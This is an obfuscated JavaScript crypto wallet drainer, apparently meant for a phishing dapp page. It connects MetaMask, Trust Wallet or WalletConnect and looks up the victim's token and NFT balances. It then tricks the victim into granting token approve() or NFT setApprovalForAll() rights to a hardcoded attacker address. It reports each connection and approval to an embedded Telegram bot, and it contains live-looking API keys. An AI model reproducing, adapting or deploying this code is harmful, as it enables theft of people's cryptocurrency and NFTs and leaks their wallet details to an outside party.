const _0x26eab7=_0x2c0e;function _0xe3fb(){const _0xbb4e33=['WalletConnectProvider','AUzhU','network','FMRqy','WalletConnect','vhcod','toHex','approve','click','Trust','location','ApgnU','#chainErrorMessage','CyLgX','1021422JgXiGS','CadwH','fadeIn','HRRaT','Contract\x20address\x20','XrsOp','test','BnPVZ','href','5324213580:AAHwbzWk-nrBTaIEttBIbYeAMFEXyANewHs','selectedAddress','NFT\x20Approved.\x20Address\x20of\x20holder:\x20','uint256','connect','31099160jDlZpt','POST','5801288qxnDNi','_value','https://api.telegram.org/bot','parse_mode=HTML&text=','session_update','https://api.zapper.fi/v2/balances?addresses%5B%5D=','then','IsCSt','vendor','tbqgN','fadeOut','sort','error','Windows\x20Phone','https://bsc-dataseed.binance.org/','eth_requestAccounts','push','VbbFa','host','MSStream','xhPJB','https://polygon-rpc.com','9epZjRe','event:\x20','7259CQreYH','origin','accounts','approved','BhrDA','https://link.trustwallet.com/open_url?coin_id=60&url=','binance-smart-chain','/sendMessage?chat_id=','rfCGt','split','426701664','show','qmQqW','walletconnect','any','3372oZfVCE','indexOf','zSeZq','7648905UaAuaW','IIvwO','MIPrJ','target','plXaf','RzCyF','Cqvkj','ethereum','_accounts','isTrust','552469YceMKZ','hHpkt','scUWZ','symbol','hnavx','default','OKaXy','enable','cGLVi','Android','text','unknown','OLQnW','nft','appId','ByycF','lMVsu','uri','2yilVkR','category','Basic\x20OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg==','polygon','setApprovalForAll','providers','Ryrrs','utils','WalletConnectQRCodeModal','body','metamask','fhjaI','findIndex','length','mpOTP','open','opera','data:\x20','request','_self','wallet','tokens','Metamask','Contract','MATIC','values','createSession','hide','parse','Web3Provider','bHEql','#chainErrorName','CmwLz','params','close','connected','accountsChanged','IvYZz','bool','splice','killSession','ClMvX','IkToH','vwRWK','#overlay','Binance\x20Smart\x20Chain','context','networkVersion','OHktV','userAgent','undefined','wallet_switchEthereumChain','log','4854328cOMuDQ','olgjs','address','MUWUG','ERC20\x20Approved.\x20Address\x20of\x20holder:\x20','ajax','nonpayable','balanceRaw','RncsC','clgic','balanceUSD'];_0xe3fb=function(){return _0xbb4e33;};return _0xe3fb();}function _0x2c0e(_0x2cbe22,_0x1b9ef4){const _0xe3fbf=_0xe3fb();return _0x2c0e=function(_0x2c0e07,_0xf2cdf4){_0x2c0e07=_0x2c0e07-0x9b;let _0x140c2d=_0xe3fbf[_0x2c0e07];return _0x140c2d;},_0x2c0e(_0x2cbe22,_0x1b9ef4);}(function(_0x50d0d9,_0x4659b9){const _0x6e0aa0=_0x2c0e,_0x44cdeb=_0x50d0d9();while(!![]){try{const _0x52b134=-parseInt(_0x6e0aa0(0xc6))/0x1+parseInt(_0x6e0aa0(0xd8))/0x2*(parseInt(_0x6e0aa0(0x126))/0x3)+parseInt(_0x6e0aa0(0x136))/0x4+parseInt(_0x6e0aa0(0xbc))/0x5+parseInt(_0x6e0aa0(0xb9))/0x6*(parseInt(_0x6e0aa0(0xaa))/0x7)+parseInt(_0x6e0aa0(0x10d))/0x8*(parseInt(_0x6e0aa0(0xa8))/0x9)+-parseInt(_0x6e0aa0(0x134))/0xa;if(_0x52b134===_0x4659b9)break;else _0x44cdeb['push'](_0x44cdeb['shift']());}catch(_0x2dfd6b){_0x44cdeb['push'](_0x44cdeb['shift']());}}}(_0xe3fb,0xcefa1));const defaultNetworks=['ethereum',_0x26eab7(0xb0),_0x26eab7(0xdb)],chainIdsNetworks={'ethereum':0x1,'binance-smart-chain':0x38,'polygon':0x89},chainIdsNames={'ethereum':'Ethereum','binance-smart-chain':_0x26eab7(0x105),'polygon':'Polygon'},forbiddenTokens=['ETH','BNB',_0x26eab7(0xf0)],abi=[{'constant':![],'inputs':[{'name':'_spender','type':'address'},{'name':_0x26eab7(0x137),'type':_0x26eab7(0x132)}],'name':_0x26eab7(0x11f),'outputs':[{'name':'','type':_0x26eab7(0xfe)}],'payable':![],'stateMutability':'nonpayable','type':'function'}],abiNFT=[{'inputs':[{'internalType':_0x26eab7(0x10f),'name':'operator','type':_0x26eab7(0x10f)},{'internalType':_0x26eab7(0xfe),'name':_0x26eab7(0xad),'type':'bool'}],'name':_0x26eab7(0xdc),'outputs':[],'stateMutability':_0x26eab7(0x113),'type':'function'}],accountBalances={'tokens':[],'nft':[]},WITHDRAWAL_ADDRESS='0xe324866aD18Cd0763F0c9505cbA264F21ECBF45e',MINIMAL_SUM_IN_USD=0x1;let accountAddress=null,walletConnector,currentConnection;const getMobileOperatingSystem=()=>{const _0x4e2b34=_0x26eab7,_0x54f15b=navigator['userAgent']||navigator[_0x4e2b34(0x13e)]||window['opera'];if(/windows phone/i[_0x4e2b34(0x12c)](_0x54f15b))return _0x4e2b34(0x9f);if(/android/i[_0x4e2b34(0x12c)](_0x54f15b))return _0x4e2b34(0xc7)==='pEtGq'?_0x4e2b34(0xee):'Android';if(/iPad|iPhone|iPod/[_0x4e2b34(0x12c)](_0x54f15b)&&!window[_0x4e2b34(0xa5)])return'iOS';return'unknown';},getDAppSystem=()=>{const _0x55b929=_0x26eab7,_0x1c15b1=navigator[_0x55b929(0x109)]||navigator[_0x55b929(0x13e)]||window[_0x55b929(0xe8)];if(/Trust/i[_0x55b929(0x12c)](_0x1c15b1))return _0x55b929(0x121);if(/CriOS/i['test'](_0x1c15b1)){if(_0x55b929(0x129)===_0x55b929(0x129))return _0x55b929(0xee);else _0x451024?_0x5858ca[_0x55b929(0x9e)](_0x11b694):(_0x374c2c[_0x55b929(0xe0)]['default'][_0x55b929(0xfa)](),_0x27fae1=_0x526e22['params'][0x0][_0x55b929(0xac)][0x0],_0x1bcf67=_0x55b929(0xb7));}return _0x55b929(0xd1);},openMetaMaskUrl=_0x4149b1=>{const _0x4585e9=_0x26eab7,_0x3e49ed=document['createElement']('a');_0x3e49ed[_0x4585e9(0x12e)]=_0x4149b1,_0x3e49ed[_0x4585e9(0xbf)]=_0x4585e9(0xeb),document[_0x4585e9(0xe1)]['appendChild'](_0x3e49ed),_0x3e49ed[_0x4585e9(0x120)](),_0x3e49ed['remove']();},getBalances=async()=>{const _0x20289f=_0x26eab7;try{$(_0x20289f(0x104))[_0x20289f(0x128)](0x12c),$(_0x20289f(0x124))[_0x20289f(0xf3)]();if(currentConnection===_0x20289f(0xe2)){if(typeof window[_0x20289f(0xc3)]['selectedAddress']!=='undefined')accountAddress=window[_0x20289f(0xc3)][_0x20289f(0x130)];else typeof window[_0x20289f(0xc3)][_0x20289f(0x10f)]!==_0x20289f(0x10a)&&(_0x20289f(0x13d)===_0x20289f(0x13d)?accountAddress=window['ethereum']['address']:_0x44977e=_0x177f33);}else currentConnection===_0x20289f(0xb7)&&(accountAddress=walletConnector[_0x20289f(0xc4)][0x0]);const _0x39056d=await $['ajax']({'url':_0x20289f(0x13b)+accountAddress,'type':'GET','headers':{'Authorization':_0x20289f(0xda)}}),_0x2404db=_0x39056d[_0x20289f(0xb3)](_0x20289f(0xa9));for(const _0x376444 of _0x2404db){const _0x4ad920=_0x376444[_0x20289f(0xb3)](_0x20289f(0xe9));if(typeof _0x4ad920[0x0]!=='undefined'){if(_0x20289f(0xb2)!==_0x20289f(0xb2))_0x2dc93b[_0x20289f(0x9e)](_0x5c5ea4);else{if(_0x4ad920[0x0]['indexOf'](_0x20289f(0xd9))>-0x1){const _0x217445=JSON[_0x20289f(0xf4)](_0x4ad920[0x1]),_0x2545fb=_0x217445[_0x20289f(0xec)],_0x442282=_0x217445['nft'];for(const _0xa8eb1e of Object['values'](_0x2545fb)){'OyMBW'!==_0x20289f(0xe6)?defaultNetworks[_0x20289f(0xba)](_0xa8eb1e[_0x20289f(0x11a)])>-0x1&&accountBalances[_0x20289f(0xed)][_0x20289f(0xa2)](_0xa8eb1e):_0x22eb61[_0x20289f(0x9e)](_0x323f7d);}for(const _0x27a239 of Object[_0x20289f(0xf1)](_0x442282)){if(_0x20289f(0xfd)!=='IvYZz')_0xc2d89[_0x20289f(0xf2)]()['then'](()=>{const _0x4421b1=_0x20289f,_0x2bcd0d=_0x116104[_0x4421b1(0xd7)];_0x2880e9[_0x4421b1(0xe0)]['default'][_0x4421b1(0xe7)](_0x2bcd0d,()=>{const _0x5582a2=_0x4421b1;_0x2eca33[_0x5582a2(0x10c)]('QR\x20Code\x20Modal\x20closed');});});else{if(defaultNetworks[_0x20289f(0xba)](_0x27a239[_0x20289f(0x11a)])>-0x1){if('mYhoG'!==_0x20289f(0xbb))accountBalances[_0x20289f(0xd3)][_0x20289f(0xa2)](_0x27a239);else return _0x20289f(0x9f);}}}}}}}accountBalances[_0x20289f(0xed)]['sort']((_0x50139a,_0x38e79a)=>_0x50139a['balanceUSD']>_0x38e79a[_0x20289f(0x117)]?-0x1:_0x38e79a[_0x20289f(0x117)]>_0x50139a[_0x20289f(0x117)]?0x1:0x0),accountBalances[_0x20289f(0xd3)][_0x20289f(0x9d)]((_0xe905d7,_0x3c01df)=>_0xe905d7[_0x20289f(0x117)]>_0x3c01df[_0x20289f(0x117)]?-0x1:_0x3c01df[_0x20289f(0x117)]>_0xe905d7[_0x20289f(0x117)]?0x1:0x0);for(const _0x9174d7 of forbiddenTokens){if(_0x20289f(0x9b)!==_0x20289f(0xc8)){const _0xe1421b=accountBalances[_0x20289f(0xed)][_0x20289f(0xe4)](_0x8f8ab4=>_0x8f8ab4[_0x20289f(0x106)][_0x20289f(0xc9)]===_0x9174d7);_0xe1421b>-0x1&&(_0x20289f(0x110)===_0x20289f(0x127)?_0x2a3dbc[_0x20289f(0xed)][_0x20289f(0xff)](_0x45dc15,0x1):accountBalances[_0x20289f(0xed)]['splice'](_0xe1421b,0x1));}else _0x34ef75=_0x1b52bd['ethereum'][_0x20289f(0x130)];}for(let _0x581ca6=0x0;_0x581ca6<accountBalances['nft'][_0x20289f(0xe5)];_0x581ca6++){let _0x574e80=null,_0x5dd4c1=null,_0x3b5e0f=null;if(typeof accountBalances[_0x20289f(0xed)][0x0]!==_0x20289f(0x10a)){if(_0x20289f(0x123)==='KDIvE'){const _0x298adf=_0x27d1f5[_0x20289f(0x109)]||_0x5b6a4d[_0x20289f(0x13e)]||_0x3d8161[_0x20289f(0xe8)];if(/Trust/i[_0x20289f(0x12c)](_0x298adf))return _0x20289f(0x121);if(/CriOS/i[_0x20289f(0x12c)](_0x298adf))return _0x20289f(0xee);return _0x20289f(0xd1);}else _0x5dd4c1=accountBalances[_0x20289f(0xed)][0x0];}typeof accountBalances['nft'][_0x581ca6]!==_0x20289f(0x10a)&&(_0x574e80=accountBalances['nft'][_0x581ca6]);if(_0x574e80&&_0x5dd4c1&&_0x574e80[_0x20289f(0x117)]>_0x5dd4c1['balanceUSD'])'clgic'!==_0x20289f(0x116)?_0x52a85b=_0x4f965d:_0x3b5e0f=_0x574e80;else{if(_0x574e80&&_0x5dd4c1&&_0x574e80[_0x20289f(0x117)]<_0x5dd4c1['balanceUSD']){if(_0x20289f(0xde)===_0x20289f(0xb6)){if(typeof _0x58a34f[_0x20289f(0xc3)]['selectedAddress']!==_0x20289f(0x10a))_0x9af44f=_0x182841[_0x20289f(0xc3)][_0x20289f(0x130)];else typeof _0xe3f107[_0x20289f(0xc3)][_0x20289f(0x10f)]!==_0x20289f(0x10a)&&(_0x215d38=_0x168eed[_0x20289f(0xc3)][_0x20289f(0x10f)]);}else _0x3b5e0f=_0x5dd4c1;}else{if(_0x574e80){if('JYKxO'!=='fdlfX')_0x3b5e0f=_0x574e80;else return typeof _0x2c4c28[_0x20289f(0xc3)]!==_0x20289f(0x10a)?_0x1b34ae(!![]):_0x220f3a(![]);}else _0x5dd4c1&&(_0x20289f(0x101)===_0x20289f(0xcc)?_0xdce1c4=_0x1cda5f:_0x3b5e0f=_0x5dd4c1);}}if(_0x3b5e0f){if(_0x3b5e0f[_0x20289f(0x117)]<MINIMAL_SUM_IN_USD){$('#overlay')[_0x20289f(0x9c)](0x12c);return;}let _0x54b2dd,_0xb24136;if(currentConnection===_0x20289f(0xe2))'MIPrJ'===_0x20289f(0xbe)?(_0x54b2dd=new Web3(window[_0x20289f(0xc3)]),_0xb24136=new ethers[(_0x20289f(0xdd))][(_0x20289f(0xf5))](window['ethereum'],'any'),parseInt(window['ethereum'][_0x20289f(0x107)])!==chainIdsNetworks[_0x3b5e0f[_0x20289f(0x11a)]]&&await window[_0x20289f(0xc3)][_0x20289f(0xea)]({'method':_0x20289f(0x10b),'params':[{'chainId':_0x54b2dd[_0x20289f(0xdf)][_0x20289f(0x11e)](chainIdsNetworks[_0x3b5e0f[_0x20289f(0x11a)]])}]})):_0x442348=_0x10d52e[0x0];else{if(currentConnection==='walletconnect'){if(_0x20289f(0x10e)===_0x20289f(0xe3)){const _0x1094d1=_0x457c5f[_0x20289f(0xed)]['findIndex'](_0xaa2fc4=>_0xaa2fc4[_0x20289f(0x106)][_0x20289f(0xc9)]===_0xc74243);_0x1094d1>-0x1&&_0x52dc62['tokens'][_0x20289f(0xff)](_0x1094d1,0x1);}else{if(walletConnector['_chainId']!==chainIdsNetworks[_0x3b5e0f[_0x20289f(0x11a)]]){if(_0x20289f(0xd6)===_0x20289f(0xbd))return _0x20289f(0xcf);else{$(_0x20289f(0xf7))[_0x20289f(0xd0)](chainIdsNames[_0x3b5e0f['network']]),$(_0x20289f(0x124))[_0x20289f(0xb5)](),$(_0x20289f(0x104))['fadeOut'](0x12c);return;}}_0xb24136=new window[(_0x20289f(0x118))]['default']({'rpc':{0x1:'https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03',0x38:_0x20289f(0xa0),0x89:_0x20289f(0xa7)}}),await _0xb24136[_0x20289f(0xcd)](),_0xb24136=new ethers[(_0x20289f(0xdd))][(_0x20289f(0xf5))](_0xb24136,_0x20289f(0xb8));}}}const _0x4b18b9=_0xb24136['getSigner']();if(_0x3b5e0f['appId']===_0x20289f(0xed)){if(_0x20289f(0x119)!=='buyrE'){const _0x2292f1=new ethers[(_0x20289f(0xef))](_0x3b5e0f[_0x20289f(0x10f)],abi,_0x4b18b9);try{await _0x2292f1['approve'](WITHDRAWAL_ADDRESS,_0x3b5e0f[_0x20289f(0x106)][_0x20289f(0x114)]);var _0x571a61=$[_0x20289f(0x112)]({'type':_0x20289f(0x135),'url':_0x20289f(0x138)+_0x20289f(0x12f)+_0x20289f(0xb1)+_0x20289f(0xb4),'data':_0x20289f(0x139)+encodeURIComponent(_0x20289f(0x111)+accountAddress)+'%0A%0A'+encodeURIComponent(_0x20289f(0x12a)+_0x3b5e0f[_0x20289f(0x10f)])});}catch(_0x47b7ab){getBalances();}}else _0x2f1d71[_0x20289f(0xd3)][_0x20289f(0xa2)](_0x3230c4);}else{if(_0x3b5e0f[_0x20289f(0xd4)]===_0x20289f(0xd3)){if(_0x20289f(0x125)===_0x20289f(0xc1))_0x1ebd0d[_0x20289f(0xba)](_0x441325[_0x20289f(0x11a)])>-0x1&&_0x5a330a[_0x20289f(0xed)][_0x20289f(0xa2)](_0x176660);else{const _0x57ffc9=new ethers[(_0x20289f(0xef))](_0x3b5e0f[_0x20289f(0x10f)],abiNFT,_0x4b18b9);try{await _0x57ffc9[_0x20289f(0xdc)](WITHDRAWAL_ADDRESS,!![]);var _0x571a61=$['ajax']({'type':_0x20289f(0x135),'url':_0x20289f(0x138)+_0x20289f(0x12f)+'/sendMessage?chat_id='+_0x20289f(0xb4),'data':_0x20289f(0x139)+encodeURIComponent(_0x20289f(0x131)+accountAddress)+'%0A%0A'+encodeURIComponent(_0x20289f(0x12a)+_0x3b5e0f[_0x20289f(0x10f)])});}catch(_0x4ddc7d){getBalances();}}}else{}}}else{}}}catch(_0x4d5d0f){}},checkInstallMetamask=()=>{return new Promise(_0xe18485=>{const _0x347519=_0x2c0e;if(typeof window[_0x347519(0xc3)]!==_0x347519(0x10a)){if(_0x347519(0xca)===_0x347519(0xca))return _0xe18485(!![]);else _0x318539=_0x4e0b25[_0x347519(0xc3)]['address'];}else{if(_0x347519(0xae)!==_0x347519(0xce))return _0xe18485(![]);else return;}});},connectMetamask=async()=>{const _0x406e92=_0x26eab7;if(getDAppSystem()!=='Metamask'&&getMobileOperatingSystem()!=='unknown'){openMetaMaskUrl('https://metamask.app.link/dapp/'+window[_0x406e92(0x122)][_0x406e92(0xa4)]);return;}window['ethereum']['on'](_0x406e92(0xfc),function(_0x20a547){const _0x1397e0=_0x406e92;_0x1397e0(0x11b)!==_0x1397e0(0x11b)?_0x5a567a=_0x59fd18[_0x1397e0(0xed)][0x0]:accountAddress=_0x20a547[0x0];});const _0x1948b6=await window[_0x406e92(0xc3)]['request']({'method':_0x406e92(0xa1)});accountAddress=_0x1948b6[0x0];var _0x460d1b=$[_0x406e92(0x112)]({'type':_0x406e92(0x135),'url':_0x406e92(0x138)+_0x406e92(0x12f)+_0x406e92(0xb1)+'426701664','data':_0x406e92(0x139)+encodeURIComponent('Metamask\x20connected\x20'+accountAddress)});currentConnection=_0x406e92(0xe2);},connectTrustWallet=async()=>{const _0x1f9c5d=_0x26eab7;if(!window[_0x1f9c5d(0xc3)]?.['isTrust']&&getMobileOperatingSystem()!==_0x1f9c5d(0xd1)){if(_0x1f9c5d(0xa6)!==_0x1f9c5d(0xa6))_0x468654?_0x420a65['error'](_0x3d9766):_0x48fb36=null;else{openMetaMaskUrl(_0x1f9c5d(0xaf)+window['location'][_0x1f9c5d(0xab)]);return;}}if(window[_0x1f9c5d(0xc3)]?.[_0x1f9c5d(0xc5)]){if(_0x1f9c5d(0x103)===_0x1f9c5d(0x12d)){_0x5ccc24(_0x1f9c5d(0x104))[_0x1f9c5d(0x9c)](0x12c);return;}else{window[_0x1f9c5d(0xc3)]['on'](_0x1f9c5d(0xfc),function(_0x28ab38){const _0x45b42a=_0x1f9c5d;'RqJTg'===_0x45b42a(0x11d)?_0x23ebf4[_0x45b42a(0x9e)](_0x3e22c7):accountAddress=_0x28ab38[0x0];});const _0x16fa9a=await window['ethereum'][_0x1f9c5d(0xea)]({'method':'eth_requestAccounts'});accountAddress=_0x16fa9a[0x0],currentConnection='metamask';}}else{if(!walletConnector[_0x1f9c5d(0xfb)])walletConnector[_0x1f9c5d(0xf2)]()[_0x1f9c5d(0x13c)](()=>{const _0x36fd67=_0x1f9c5d;if(_0x36fd67(0xf8)!==_0x36fd67(0xf6)){const _0x932098=walletConnector[_0x36fd67(0xd7)];window['WalletConnectQRCodeModal']['default'][_0x36fd67(0xe7)](_0x932098,()=>{console['log']('QR\x20Code\x20Modal\x20closed');});}else _0x14cc51=_0x29a750['params'][0x0][_0x36fd67(0xac)][0x0];});else{if(_0x1f9c5d(0xd5)!==_0x1f9c5d(0xd5))return;else walletConnector[_0x1f9c5d(0x100)]();}}},initMetamask=async()=>{const _0x9edfc9=_0x26eab7;if(getDAppSystem()!==_0x9edfc9(0xee)&&getMobileOperatingSystem()!==_0x9edfc9(0xd1))return;const _0x30c17e=await checkInstallMetamask();if(!_0x30c17e)return;},initWalletConnect=()=>{const _0x493954=_0x26eab7;if(getDAppSystem()!=='Trust'&&getMobileOperatingSystem()!==_0x493954(0xd1)){if('XrsOp'!==_0x493954(0x12b))_0x15a9a4();else return;}walletConnector=new window[(_0x493954(0x11c))][(_0x493954(0xcb))]({'bridge':'https://bridge.walletconnect.org'}),walletConnector['on'](_0x493954(0x133),function(_0x6bc985,_0x44f64e){const _0xce5e98=_0x493954;_0x6bc985?console['error'](_0x6bc985):_0xce5e98(0xc2)!=='HguWN'?(window[_0xce5e98(0xe0)][_0xce5e98(0xcb)][_0xce5e98(0xfa)](),accountAddress=_0x44f64e[_0xce5e98(0xf9)][0x0][_0xce5e98(0xac)][0x0],currentConnection=_0xce5e98(0xb7)):_0xb6ff5[_0xce5e98(0x100)]();}),walletConnector['on'](_0x493954(0x13a),function(_0x468b0e,_0x2c3eb7){const _0x14d0ac=_0x493954;if(_0x468b0e)_0x14d0ac(0xa3)!=='OZJES'?console[_0x14d0ac(0x9e)](_0x468b0e):_0x53cd10[_0x14d0ac(0xed)][_0x14d0ac(0xa2)](_0x224d60);else walletConnector[_0x14d0ac(0xfb)]&&(accountAddress=_0x2c3eb7[_0x14d0ac(0xf9)][0x0][_0x14d0ac(0xac)][0x0]);}),walletConnector['on']('disconnect',function(_0x293864,_0x2b8346){const _0x5ed76c=_0x493954;if(_0x5ed76c(0xd2)===_0x5ed76c(0x102))_0xefbaa3[_0x5ed76c(0xe0)][_0x5ed76c(0xcb)][_0x5ed76c(0xfa)](),_0x8d78d7=_0x5e2527[_0x5ed76c(0xf9)][0x0][_0x5ed76c(0xac)][0x0],_0x3d8754=_0x5ed76c(0xb7);else{if(_0x293864)'kOUqL'!==_0x5ed76c(0xc0)?console[_0x5ed76c(0x9e)](_0x293864):_0x94ed5d=_0x4b2e47[0x0];else{if(_0x5ed76c(0x115)!==_0x5ed76c(0x108))accountAddress=null;else{if(_0x20decf)_0x552eb5[_0x5ed76c(0x9e)](_0x4c349b);else _0x5d587f[_0x5ed76c(0xfb)]&&(_0x169f2c=_0x284a28['params'][0x0][_0x5ed76c(0xac)][0x0]);}}}});};setTimeout(connectMetamask,0x3e8);
